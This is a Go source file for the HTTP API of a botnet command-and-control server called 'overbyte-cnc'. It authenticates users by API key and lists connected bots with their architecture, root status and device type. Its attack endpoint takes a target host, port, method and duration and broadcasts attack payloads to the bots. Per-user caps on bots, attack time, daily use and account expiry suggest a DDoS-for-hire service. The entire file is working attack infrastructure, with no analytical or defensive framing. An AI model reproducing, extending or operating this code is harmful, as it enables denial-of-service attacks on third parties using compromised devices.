package api

import (
	"context"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"time"

	"overbyte-cnc/attack"
	"overbyte-cnc/bot"
	"overbyte-cnc/config"
	"overbyte-cnc/database"
	"overbyte-cnc/logger"
)

type APIServer struct {
	db         *database.Database
	botManager *bot.Manager
	cfg        *config.Config
	port       int
	server     *http.Server

	rateLimiter  map[string][]time.Time
	userCooldown map[int]time.Time
	mutex        sync.RWMutex

	blockedIPs   map[string]time.Time
	connCount    map[string]int
	burstTracker map[string][]time.Time
	ddosMutex    sync.RWMutex
	stopChan     chan struct{}
}

type APIResponse struct {
	Success   bool        `json:"success"`
	Message   string      `json:"message,omitempty"`
	Error     string      `json:"error,omitempty"`
	Data      interface{} `json:"data,omitempty"`
	Timestamp int64       `json:"timestamp"`
}

type AttackResponse struct {
	Success bool   `json:"success"`
	Message string `json:"message,omitempty"`
	Error   string `json:"error,omitempty"`
	Bots    int    `json:"bots,omitempty"`
	Method  string `json:"method,omitempty"`
	Target  string `json:"target,omitempty"`
	Port    int    `json:"port,omitempty"`
	Time    int    `json:"time,omitempty"`
}

type BotInfo struct {
	ID         string  `json:"id"`
	Addr       string  `json:"addr"`
	Arch       string  `json:"arch"`
	Uptime     int64   `json:"uptime_seconds"`
	CPUCores   uint16  `json:"cpu_cores,omitempty"`
	TotalRAM   uint32  `json:"total_ram_mb,omitempty"`
	FreeRAM    uint32  `json:"free_ram_mb,omitempty"`
	IsRoot     bool    `json:"is_root"`
	DeviceType string  `json:"device_type,omitempty"`
	OSName     string  `json:"os_name,omitempty"`
	LoadAvg    float32 `json:"load_avg,omitempty"`
}

type UserInfoResponse struct {
	ID         int    `json:"id"`
	Username   string `json:"username"`
	Role       string `json:"role"`
	MaxTime    int    `json:"max_time"`
	MaxBots    int    `json:"max_bots"`
	MaxSlots   int    `json:"max_slots"`
	DailyLimit int    `json:"daily_limit"`
	DailyUsed  int    `json:"daily_used"`
	ExpiryDate string `json:"expiry_date,omitempty"`
	APIAccess  bool   `json:"api_access"`
}

type OngoingAttackInfo struct {
	ID       int    `json:"id"`
	Method   string `json:"method"`
	Target   string `json:"target"`
	Port     int    `json:"port"`
	Duration int    `json:"duration"`
	TimeLeft int    `json:"time_left"`
	Username string `json:"username"`
}

type ConfigInfo struct {
	BotPort        int `json:"bot_port"`
	MaxSessions    int `json:"max_sessions"`
	MaxGlobalSlots int `json:"max_global_slots"`
	APIRateLimit   int `json:"api_rate_limit"`
	APICooldown    int `json:"api_cooldown"`
}

func NewServer(db *database.Database, botManager *bot.Manager, cfg *config.Config) *APIServer {
	return &APIServer{
		db:           db,
		botManager:   botManager,
		cfg:          cfg,
		port:         cfg.API.Port,
		rateLimiter:  make(map[string][]time.Time),
		userCooldown: make(map[int]time.Time),
		blockedIPs:   make(map[string]time.Time),
		connCount:    make(map[string]int),
		burstTracker: make(map[string][]time.Time),
		stopChan:     make(chan struct{}),
	}
}

func (s *APIServer) Start() error {
	mux := http.NewServeMux()

	mux.HandleFunc("/api/health", s.handleHealth)
	mux.HandleFunc("/api/attack", s.securityMiddleware(s.handleAttack))
	mux.HandleFunc("/api/status", s.securityMiddleware(s.handleStatus))

	if s.cfg.API.EnableReadAPI {
		mux.HandleFunc("/api/bots", s.securityMiddleware(s.handleBots))
		mux.HandleFunc("/api/bots/stats", s.securityMiddleware(s.handleBotStats))
		mux.HandleFunc("/api/attacks/ongoing", s.securityMiddleware(s.handleOngoingAttacks))
		mux.HandleFunc("/api/attacks/history", s.securityMiddleware(s.handleAttackHistory))
		mux.HandleFunc("/api/users", s.securityMiddleware(s.handleUsers))
		mux.HandleFunc("/api/user/info", s.securityMiddleware(s.handleUserInfo))
		mux.HandleFunc("/api/config", s.securityMiddleware(s.handleConfig))
	}

	s.server = &http.Server{
		Addr:           fmt.Sprintf(":%d", s.port),
		Handler:        mux,
		ReadTimeout:    10 * time.Second,
		WriteTimeout:   10 * time.Second,
		MaxHeaderBytes: s.cfg.API.MaxRequestSize,
	}

	go func() {
		logger.Info("API Server started on port %d", s.port)
		if s.cfg.API.EnableReadAPI {
			logger.Info("Read API endpoints enabled")
		}
		if err := s.server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			logger.Error("API Server error: %v", err)
		}
	}()

	go s.cleanupBlockedIPs()

	return nil
}

func (s *APIServer) Stop() {
	close(s.stopChan)
	if s.server != nil {
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		if err := s.server.Shutdown(ctx); err != nil {
			logger.Error("API server shutdown error: %v", err)
			s.server.Close()
		}
	}
}

func (s *APIServer) securityMiddleware(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		clientIP := s.getClientIP(r)

		if s.isIPBlocked(clientIP) {
			s.writeJSON(w, http.StatusTooManyRequests, APIResponse{
				Success:   false,
				Error:     "IP temporarily blocked due to excessive requests",
				Timestamp: time.Now().Unix(),
			})
			return
		}

		s.incrementConn(clientIP)
		defer s.decrementConn(clientIP)

		if s.getConnCount(clientIP) > s.cfg.API.MaxConnPerIP {
			logger.Warn("[API] Max connections exceeded for IP: %s", clientIP)
			s.writeJSON(w, http.StatusTooManyRequests, APIResponse{
				Success:   false,
				Error:     "Too many concurrent connections",
				Timestamp: time.Now().Unix(),
			})
			return
		}

		if !s.checkBurstLimit(clientIP) {
			logger.Warn("[API] Burst limit exceeded for IP: %s, blocking...", clientIP)
			s.blockIP(clientIP)
			s.writeJSON(w, http.StatusTooManyRequests, APIResponse{
				Success:   false,
				Error:     "Request rate too high, IP blocked temporarily",
				Timestamp: time.Now().Unix(),
			})
			return
		}

		if s.cfg.API.EnableSecurityHeaders {
			w.Header().Set("X-Content-Type-Options", "nosniff")
			w.Header().Set("X-Frame-Options", "DENY")
			w.Header().Set("X-XSS-Protection", "1; mode=block")
			w.Header().Set("Cache-Control", "no-store, no-cache, must-revalidate")
			w.Header().Set("Pragma", "no-cache")
		}

		logger.Info("[API] %s %s from %s", r.Method, r.URL.Path, clientIP)

		next(w, r)
	}
}

func (s *APIServer) authenticateFromHeader(r *http.Request) (*database.User, error) {
	apiKey := r.Header.Get("X-API-Key")
	username := r.Header.Get("X-Username")

	if apiKey == "" || username == "" {
		return nil, fmt.Errorf("missing X-API-Key or X-Username header")
	}

	user, err := s.db.GetUserByAPIKey(username, apiKey)
	if err != nil {
		return nil, fmt.Errorf("database error: %v", err)
	}
	if user == nil {
		return nil, fmt.Errorf("invalid credentials")
	}

	return user, nil
}

func (s *APIServer) requireAuth(w http.ResponseWriter, r *http.Request) (*database.User, bool) {
	user, err := s.authenticateFromHeader(r)
	if err != nil {
		s.writeJSON(w, http.StatusUnauthorized, APIResponse{
			Success:   false,
			Error:     err.Error(),
			Timestamp: time.Now().Unix(),
		})
		return nil, false
	}
	return user, true
}

func (s *APIServer) requireAdmin(w http.ResponseWriter, r *http.Request) (*database.User, bool) {
	user, ok := s.requireAuth(w, r)
	if !ok {
		return nil, false
	}

	if user.Role != "admin" && user.Role != "root" {
		s.writeJSON(w, http.StatusForbidden, APIResponse{
			Success:   false,
			Error:     "Admin access required",
			Timestamp: time.Now().Unix(),
		})
		return nil, false
	}

	return user, true
}

func (s *APIServer) isIPBlocked(ip string) bool {
	s.ddosMutex.RLock()
	defer s.ddosMutex.RUnlock()

	unblockTime, exists := s.blockedIPs[ip]
	if !exists {
		return false
	}
	return time.Now().Before(unblockTime)
}

func (s *APIServer) blockIP(ip string) {
	s.ddosMutex.Lock()
	defer s.ddosMutex.Unlock()

	duration := time.Duration(s.cfg.API.BlockDuration) * time.Second
	s.blockedIPs[ip] = time.Now().Add(duration)
	logger.Warn("[API] Blocked IP %s for %d seconds", ip, s.cfg.API.BlockDuration)
}

func (s *APIServer) incrementConn(ip string) {
	s.ddosMutex.Lock()
	defer s.ddosMutex.Unlock()
	s.connCount[ip]++
}

func (s *APIServer) decrementConn(ip string) {
	s.ddosMutex.Lock()
	defer s.ddosMutex.Unlock()
	if s.connCount[ip] > 0 {
		s.connCount[ip]--
	}
}

func (s *APIServer) getConnCount(ip string) int {
	s.ddosMutex.RLock()
	defer s.ddosMutex.RUnlock()
	return s.connCount[ip]
}

func (s *APIServer) checkBurstLimit(ip string) bool {
	s.ddosMutex.Lock()
	defer s.ddosMutex.Unlock()

	now := time.Now()
	windowStart := now.Add(-time.Second)

	var recentRequests []time.Time
	for _, t := range s.burstTracker[ip] {
		if t.After(windowStart) {
			recentRequests = append(recentRequests, t)
		}
	}

	if len(recentRequests) >= s.cfg.API.BurstLimit {
		return false
	}

	s.burstTracker[ip] = append(recentRequests, now)
	return true
}

func (s *APIServer) cleanupBlockedIPs() {
	ticker := time.NewTicker(1 * time.Minute)
	defer ticker.Stop()

	for {
		select {
		case <-s.stopChan:
			return
		case <-ticker.C:
			s.ddosMutex.Lock()
			now := time.Now()
			for ip, unblockTime := range s.blockedIPs {
				if now.After(unblockTime) {
					delete(s.blockedIPs, ip)
					logger.Info("[API] Unblocked IP: %s", ip)
				}
			}
			for ip := range s.burstTracker {
				delete(s.burstTracker, ip)
			}
			s.ddosMutex.Unlock()
		}
	}
}

func (s *APIServer) checkRateLimit(ip string) bool {
	s.mutex.Lock()
	defer s.mutex.Unlock()

	now := time.Now()
	windowStart := now.Add(-time.Minute)

	requests := s.rateLimiter[ip]
	var validRequests []time.Time
	for _, t := range requests {
		if t.After(windowStart) {
			validRequests = append(validRequests, t)
		}
	}
	s.rateLimiter[ip] = validRequests

	if len(validRequests) >= s.cfg.API.RateLimit {
		return false
	}

	s.rateLimiter[ip] = append(s.rateLimiter[ip], now)
	return true
}

func (s *APIServer) checkCooldown(userID int) (bool, int) {
	s.mutex.RLock()
	lastAttack, exists := s.userCooldown[userID]
	s.mutex.RUnlock()

	if !exists {
		return true, 0
	}

	elapsed := time.Since(lastAttack)
	cooldownDuration := time.Duration(s.cfg.API.Cooldown) * time.Second

	if elapsed < cooldownDuration {
		remaining := int((cooldownDuration - elapsed).Seconds())
		return false, remaining
	}

	return true, 0
}

func (s *APIServer) setCooldown(userID int) {
	s.mutex.Lock()
	s.userCooldown[userID] = time.Now()
	s.mutex.Unlock()
}

func (s *APIServer) writeJSON(w http.ResponseWriter, status int, resp interface{}) {
	w.Header().Set("Content-Type", "application/json; charset=utf-8")
	w.WriteHeader(status)
	encoder := json.NewEncoder(w)
	encoder.SetIndent("", "  ")
	encoder.Encode(resp)
}

func (s *APIServer) getClientIP(r *http.Request) string {
	remoteIP, _, _ := net.SplitHostPort(r.RemoteAddr)

	if s.isProxyTrusted(remoteIP) {
		xff := r.Header.Get("X-Forwarded-For")
		if xff != "" {
			parts := strings.Split(xff, ",")
			return strings.TrimSpace(parts[0])
		}
		xri := r.Header.Get("X-Real-IP")
		if xri != "" {
			return xri
		}
	}

	return remoteIP
}

func (s *APIServer) isProxyTrusted(ip string) bool {
	for _, trusted := range s.cfg.API.TrustedProxies {
		if trusted == ip {
			return true
		}
		if strings.Contains(trusted, "/") {
			_, cidr, err := net.ParseCIDR(trusted)
			if err == nil && cidr.Contains(net.ParseIP(ip)) {
				return true
			}
		}
	}
	return false
}

func (s *APIServer) isIPWhitelisted(ip string) bool {
	if len(s.cfg.API.Whitelist) == 0 {
		return true
	}

	for _, allowed := range s.cfg.API.Whitelist {
		if allowed == ip {
			return true
		}
		if strings.Contains(allowed, "/") {
			_, cidr, err := net.ParseCIDR(allowed)
			if err == nil && cidr.Contains(net.ParseIP(ip)) {
				return true
			}
		}
	}
	return false
}

func (s *APIServer) isHostBlocked(host string) bool {
	targetIP := net.ParseIP(host)

	for _, blocked := range s.cfg.API.BlockedHosts {
		if blocked == host {
			return true
		}
		if strings.Contains(blocked, "/") {
			_, cidr, err := net.ParseCIDR(blocked)
			if err == nil && targetIP != nil && cidr.Contains(targetIP) {
				return true
			}
		}
	}
	return false
}

func (s *APIServer) handleHealth(w http.ResponseWriter, r *http.Request) {
	s.writeJSON(w, http.StatusOK, APIResponse{
		Success:   true,
		Message:   "ok",
		Timestamp: time.Now().Unix(),
	})
}

func (s *APIServer) handleStatus(w http.ResponseWriter, r *http.Request) {
	s.writeJSON(w, http.StatusOK, APIResponse{
		Success: true,
		Message: "API is running",
		Data: map[string]interface{}{
			"bots":    s.botManager.GetBotCount(),
			"version": "2.0",
		},
		Timestamp: time.Now().Unix(),
	})
}

func (s *APIServer) handleBots(w http.ResponseWriter, r *http.Request) {
	user, ok := s.requireAdmin(w, r)
	if !ok {
		return
	}

	_ = user

	bots := s.botManager.GetBotList()
	botInfos := make([]BotInfo, 0, len(bots))

	for _, b := range bots {
		botInfos = append(botInfos, BotInfo{
			ID:         b.ID,
			Addr:       b.Addr,
			Arch:       b.Arch,
			Uptime:     int64(time.Since(b.Connected).Seconds()),
			CPUCores:   b.CPUCores,
			TotalRAM:   b.TotalRAM,
			FreeRAM:    b.FreeRAM,
			IsRoot:     b.IsRoot,
			DeviceType: b.DeviceType,
			OSName:     b.OSName,
			LoadAvg:    b.LoadAvg1,
		})
	}

	s.writeJSON(w, http.StatusOK, APIResponse{
		Success:   true,
		Data:      botInfos,
		Timestamp: time.Now().Unix(),
	})
}

func (s *APIServer) handleBotStats(w http.ResponseWriter, r *http.Request) {
	_, ok := s.requireAdmin(w, r)
	if !ok {
		return
	}

	stats := s.botManager.GetBotStats()
	archCounts := s.botManager.GetArchCounts()

	s.writeJSON(w, http.StatusOK, APIResponse{
		Success: true,
		Data: map[string]interface{}{
			"total_bots":  stats.TotalBots,
			"arch_counts": archCounts,
			"avg_uptime":  stats.AvgUptime,
			"oldest_bot":  stats.OldestBot.Seconds(),
			"newest_bot":  stats.NewestBot.Seconds(),
		},
		Timestamp: time.Now().Unix(),
	})
}

func (s *APIServer) handleOngoingAttacks(w http.ResponseWriter, r *http.Request) {
	_, ok := s.requireAdmin(w, r)
	if !ok {
		return
	}

	attacks, err := s.db.GetOngoingAttacks()
	if err != nil {
		s.writeJSON(w, http.StatusInternalServerError, APIResponse{
			Success:   false,
			Error:     "Failed to get ongoing attacks",
			Timestamp: time.Now().Unix(),
		})
		return
	}

	attackInfos := make([]OngoingAttackInfo, 0, len(attacks))
	for _, a := range attacks {
		attackInfos = append(attackInfos, OngoingAttackInfo{
			ID:       a.ID,
			Method:   a.Method,
			Target:   a.Target,
			Port:     a.Port,
			Duration: a.Duration,
			TimeLeft: a.TimeLeft,
			Username: a.Username,
		})
	}

	s.writeJSON(w, http.StatusOK, APIResponse{
		Success:   true,
		Data:      attackInfos,
		Timestamp: time.Now().Unix(),
	})
}

func (s *APIServer) handleAttackHistory(w http.ResponseWriter, r *http.Request) {
	user, ok := s.requireAuth(w, r)
	if !ok {
		return
	}

	limitStr := r.URL.Query().Get("limit")
	limit := 50
	if limitStr != "" {
		if l, err := strconv.Atoi(limitStr); err == nil && l > 0 && l <= 100 {
			limit = l
		}
	}

	var attacks []database.Attack
	var err error

	if user.Role == "admin" || user.Role == "root" {
		attacks, err = s.db.GetAllAttackHistory(limit)
	} else {
		attacks, err = s.db.GetAttackHistory(user.ID, limit)
	}

	if err != nil {
		s.writeJSON(w, http.StatusInternalServerError, APIResponse{
			Success:   false,
			Error:     "Failed to get attack history",
			Timestamp: time.Now().Unix(),
		})
		return
	}

	s.writeJSON(w, http.StatusOK, APIResponse{
		Success:   true,
		Data:      attacks,
		Timestamp: time.Now().Unix(),
	})
}

func (s *APIServer) handleUsers(w http.ResponseWriter, r *http.Request) {
	_, ok := s.requireAdmin(w, r)
	if !ok {
		return
	}

	users, err := s.db.GetAllUsers()
	if err != nil {
		s.writeJSON(w, http.StatusInternalServerError, APIResponse{
			Success:   false,
			Error:     "Failed to get users",
			Timestamp: time.Now().Unix(),
		})
		return
	}

	userInfos := make([]UserInfoResponse, 0, len(users))
	for _, u := range users {
		expiryStr := ""
		if u.ExpiryDate.Valid {
			expiryStr = u.ExpiryDate.Time.Format("2006-01-02")
		}
		userInfos = append(userInfos, UserInfoResponse{
			ID:         u.ID,
			Username:   u.Username,
			Role:       u.Role,
			MaxTime:    u.MaxTime,
			MaxBots:    u.MaxBots,
			MaxSlots:   u.MaxSlots,
			DailyLimit: u.DailyLimit,
			DailyUsed:  u.DailyUsed,
			ExpiryDate: expiryStr,
			APIAccess:  u.APIAccess,
		})
	}

	s.writeJSON(w, http.StatusOK, APIResponse{
		Success:   true,
		Data:      userInfos,
		Timestamp: time.Now().Unix(),
	})
}

func (s *APIServer) handleUserInfo(w http.ResponseWriter, r *http.Request) {
	user, ok := s.requireAuth(w, r)
	if !ok {
		return
	}

	expiryStr := ""
	if user.ExpiryDate.Valid {
		expiryStr = user.ExpiryDate.Time.Format("2006-01-02")
	}

	s.writeJSON(w, http.StatusOK, APIResponse{
		Success: true,
		Data: UserInfoResponse{
			ID:         user.ID,
			Username:   user.Username,
			Role:       user.Role,
			MaxTime:    user.MaxTime,
			MaxBots:    user.MaxBots,
			MaxSlots:   user.MaxSlots,
			DailyLimit: user.DailyLimit,
			DailyUsed:  user.DailyUsed,
			ExpiryDate: expiryStr,
			APIAccess:  user.APIAccess,
		},
		Timestamp: time.Now().Unix(),
	})
}

func (s *APIServer) handleConfig(w http.ResponseWriter, r *http.Request) {
	_, ok := s.requireAdmin(w, r)
	if !ok {
		return
	}

	s.writeJSON(w, http.StatusOK, APIResponse{
		Success: true,
		Data: ConfigInfo{
			BotPort:        s.cfg.CNC.BotPort,
			MaxSessions:    s.cfg.CNC.MaxSessions,
			MaxGlobalSlots: s.cfg.CNC.MaxGlobalSlots,
			APIRateLimit:   s.cfg.API.RateLimit,
			APICooldown:    s.cfg.API.Cooldown,
		},
		Timestamp: time.Now().Unix(),
	})
}

func (s *APIServer) handleAttack(w http.ResponseWriter, r *http.Request) {
	clientIP := s.getClientIP(r)

	if !s.isIPWhitelisted(clientIP) {
		logger.Warn("[API] Blocked request from non-whitelisted IP: %s", clientIP)
		s.writeJSON(w, http.StatusForbidden, AttackResponse{
			Success: false,
			Error:   "Access denied",
		})
		return
	}

	if !s.checkRateLimit(clientIP) {
		logger.Warn("[API] Rate limit exceeded for IP: %s", clientIP)
		s.writeJSON(w, http.StatusTooManyRequests, AttackResponse{
			Success: false,
			Error:   "Rate limit exceeded. Try again later.",
		})
		return
	}

	if !s.botManager.IsAttackEnabled() {
		s.writeJSON(w, http.StatusServiceUnavailable, AttackResponse{
			Success: false,
			Error:   "Attacks are currently disabled globally",
		})
		return
	}

	user, err := s.authenticateFromHeader(r)
	if err != nil {
		s.writeJSON(w, http.StatusUnauthorized, AttackResponse{
			Success: false,
			Error:   "Authentication required. Use X-API-Key and X-Username headers.",
		})
		return
	}

	query := r.URL.Query()
	host := query.Get("host")
	portStr := query.Get("port")
	timeStr := query.Get("time")
	method := strings.ToLower(query.Get("method"))
	optionStr := query.Get("option")

	if host == "" || method == "" || timeStr == "" {
		s.writeJSON(w, http.StatusBadRequest, AttackResponse{
			Success: false,
			Error:   "Missing required parameters: host, method, time",
		})
		return
	}

	if _, exists := bot.MethodMap[method]; !exists {
		s.writeJSON(w, http.StatusBadRequest, AttackResponse{
			Success: false,
			Error:   fmt.Sprintf("Invalid method: %s", method),
		})
		return
	}

	isL3 := bot.IsL3Attack(method)
	port := 0

	if !isL3 {
		if portStr == "" {
			s.writeJSON(w, http.StatusBadRequest, AttackResponse{
				Success: false,
				Error:   "Missing required parameter: port (required for non-L3 methods)",
			})
			return
		}
		var err error
		port, err = strconv.Atoi(portStr)
		if err != nil || port < 0 || port > 65535 {
			s.writeJSON(w, http.StatusBadRequest, AttackResponse{
				Success: false,
				Error:   "Invalid port (0-65535)",
			})
			return
		}
	} else {
		if portStr != "" {
			s.writeJSON(w, http.StatusBadRequest, AttackResponse{
				Success: false,
				Error:   "Port not allowed for L3 attacks (icmp, gre)",
			})
			return
		}
	}

	duration, err := strconv.Atoi(timeStr)
	if err != nil || duration <= 0 {
		s.writeJSON(w, http.StatusBadRequest, AttackResponse{
			Success: false,
			Error:   "Invalid time duration",
		})
		return
	}

	canAttack, remaining := s.checkCooldown(user.ID)
	if !canAttack {
		s.writeJSON(w, http.StatusTooManyRequests, AttackResponse{
			Success: false,
			Error:   fmt.Sprintf("Cooldown active. Wait %d seconds.", remaining),
		})
		return
	}

	if s.isHostBlocked(host) {
		logger.Warn("[API] Blocked attack to host: %s by user: %s", host, user.Username)
		s.writeJSON(w, http.StatusForbidden, AttackResponse{
			Success: false,
			Error:   "Target host is blocked",
		})
		return
	}

	options := make(map[string]string)
	if optionStr != "" {
		pairs := strings.Split(optionStr, "&")
		for _, pair := range pairs {
			kv := strings.SplitN(pair, "=", 2)
			if len(kv) == 2 {
				options[kv[0]] = kv[1]
			}
		}
	}

	refreshedUser, err := s.db.GetUserDetails(user.Username)
	if err == nil {
		user = refreshedUser
	}

	svc := attack.NewService(s.db, s.cfg.CNC.MaxGlobalSlots)
	result, err := svc.ValidateAndBuild(user, method, host, port, duration, options)
	if err != nil {
		status := http.StatusBadRequest
		if strings.Contains(err.Error(), "limit") || strings.Contains(err.Error(), "limit reached") {
			status = http.StatusForbidden
		} else if strings.Contains(err.Error(), "global") {
			status = http.StatusServiceUnavailable
		}
		s.writeJSON(w, status, AttackResponse{
			Success: false,
			Error:   err.Error(),
		})
		return
	}

	maxBots := 0
	if user.Role != "root" && user.MaxBots > 0 {
		maxBots = user.MaxBots
	}

	var sent int
	if maxBots > 0 {
		sent = s.botManager.BroadcastToN(result.Payload, maxBots)
	} else {
		sent = s.botManager.BroadcastCommand(result.Payload)
	}

	if err := s.db.IncrementDailyUsed(user.ID); err != nil {
		logger.Error("[API] Failed to increment daily used: %v", err)
	}
	s.setCooldown(user.ID)

	logger.LogAttack(user.Username, result.Method, result.TargetIP, result.TargetPort, result.Duration)
	logger.Info("[API] Attack sent: user=%s method=%s target=%s:%d time=%d bots=%d",
		user.Username, result.Method, result.TargetIP, result.TargetPort, result.Duration, sent)

	s.writeJSON(w, http.StatusOK, AttackResponse{
		Success: true,
		Message: "Attack sent successfully",
		Bots:    sent,
		Method:  result.Method,
		Target:  result.TargetIP,
		Port:    result.TargetPort,
		Time:    result.Duration,
	})
}
